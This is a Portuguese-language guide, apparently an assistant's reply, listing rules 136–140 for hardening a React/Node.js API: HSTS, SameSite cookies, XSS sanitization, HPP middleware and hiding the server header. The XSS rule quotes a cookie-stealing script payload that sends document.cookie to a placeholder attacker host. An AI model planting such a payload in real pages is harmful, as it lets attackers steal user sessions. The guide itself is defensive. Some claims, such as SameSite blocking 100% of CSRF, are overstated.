@@ -1,0 +1,48 @@
+Se formos fechar o ciclo de comunicação HTTP da sua API, cruzando as fronteiras de rede para garantir que os dados trafeguem com segurança militar entre o React e a sua VPS de 4 GB da Hostinger, entramos nas Regras de Criptografia de Tráfego e Proteção de Payload (Regras 136 a 140).
+
+Essas regras são focadas em blindar o transporte das requisições, impedindo que os dados sejam lidos ou alterados no meio do caminho por ataques de interceptação de rede (como roteadores Wi-Fi públicos maliciosos ou sniffing de pacotes):
+
+136. Protocolo TLS Estrito (HSTS - HTTP Strict Transport Security)
+Mesmo que você configure o certificado SSL (HTTPS) na Cloudflare ou no Nginx, um atacante pode tentar forçar o navegador do cliente a se conectar usando HTTP puro (porta 80) por meio de um ataque de downgrade (como o SSL Strip). Se o cliente cair no truque, os tokens e senhas passam a trafegar em texto aberto na rede.
+
+A Regra: A API e o Front-end devem proibir conexões HTTP normais diretamente no navegador do cliente.
+
+O Correto: Ative o cabeçalho Strict-Transport-Security (HSTS). Esse cabeçalho avisa ao navegador do usuário o seguinte: "Pelos próximos dois anos, nunca aceite se comunicar com este domínio via HTTP. Se o usuário digitar http://, mude automaticamente para https:// antes de enviar qualquer dado para a rede".
+
+137. Banir Cookies Sem Atributo SameSite (Anti-CSRF de API)
+Se a sua API Node.js utiliza cookies para armazenar o token de sessão ou o ID do usuário, um ataque clássico é o Cross-Site Request Forgery (CSRF). O usuário entra em um site malicioso enquanto está logado no seu app, e esse site malicioso dispara requisições ocultas para a sua API. O navegador envia o cookie legítimo junto automaticamente, e a sua API processa a ação achando que foi o seu usuário real que clicou.
+
+A Regra: Todo cookie de sessão gerado pelo Node.js deve usar a configuração de isolamento contextual.
+
+O Correto: Configure os atributos do cookie com SameSite=Strict (ou Lax) e Secure. O SameSite=Strict garante que o navegador só enviará o cookie se a requisição partiu estritamente de dentro do seu próprio domínio (novaisfitness.com), bloqueando 100% de qualquer tentativa de requisição forjada vinda de sites externos.
+
+138. Sanitização de Caracteres Especiais no JSON de Entrada (Anti-XSS Persistente)
+O Zod (Regra 131) garante que o campo nome seja uma string. Porém, o hacker ainda pode enviar uma string válida contendo código malicioso, como: <script>fetch('http://hacker.com?cookie=' + document.cookie)</script>. Se você salvar essa string direto no Supabase e depois o painel administrativo do Instituto Mix ou da Diff Store renderizar esse nome na tela, o código do hacker roda no navegador do administrador.
+
+A Regra: Dados baseados em texto que serão exibidos para outros usuários devem ser limpos antes de tocarem o banco de dados.
+
+O Correto: Use bibliotecas de sanitização como o isomorphic-dompurify no backend. Antes de salvar no banco, o Node passa o texto pelo filtro, limpando qualquer tag <script>, eventos onload ou onerror, transformando o texto perigoso em texto puro e inofensivo.
+
+139. Proteção contra Ataques de Poluição de Parâmetros HTTP (HPP)
+No Burp Suite, o hacker tenta enviar o mesmo parâmetro várias vezes na URL para confundir a lógica do seu backend, transformando uma variável simples em um array. Exemplo: /api/treino?id=10&id=20. Se o seu código Node.js espera apenas uma string e faz algo como id.toUpperCase(), a aplicação vai estourar um erro interno em produção e derrubar o processo do Express se não houver um try/catch.
+
+A Regra: Garantir a consistência do tipo de dado recebido por query strings.
+
+O Correto: Use o middleware hpp() na sua aplicação Express. Ele varre a URL e limpa parâmetros duplicados de forma automática, mantendo apenas o último valor enviado ou tratando-o para que a sua lógica interna nunca quebre por receber o tipo de dado errado.
+
+140. Ofuscação de Assinatura de Servidor (Server Header Masking)
+Por padrão, servidores Express/Node.js enviam um cabeçalho HTTP em todas as respostas chamado X-Powered-By: Express. Isso avisa explicitamente ao hacker qual é a tecnologia exata rodando por trás do seu app. Se amanhã descobrirem uma falha crítica em uma versão específica do Express, os hackers usarão robôs para varrer a internet procurando servidores que exibem essa assinatura para invadi-los em massa.
+
+A Regra: É proibido expor a marca ou a versão do seu servidor de backend nas respostas HTTP.
+
+O Correto: Desative o cabeçalho nativo diretamente na configuração do seu app Node.js antes de declarar as rotas:
+
+JavaScript
+const app = express();
+app.disable('x-powered-by');
+(O Helmet configurado na Regra 135 já faz isso automaticamente por você, garantindo que o seu backend não deixe rastros).
+
+👑 O Mapeamento Completo da API: 140 Regras Inegociáveis
+Com essas últimas adições de tráfego, o esqueleto do seu sistema de comunicação HTTP entre React e Node.js está perfeitamente trancado.
+
+O painel de controle que você montou no terminal agora gerencia 140 diretrizes de engenharia de software pura. O seu ecossistema está blindado na entrada, na lógica de negócio, na gravação do banco de dados e no transporte de pacotes pela internet. Você está pronto!
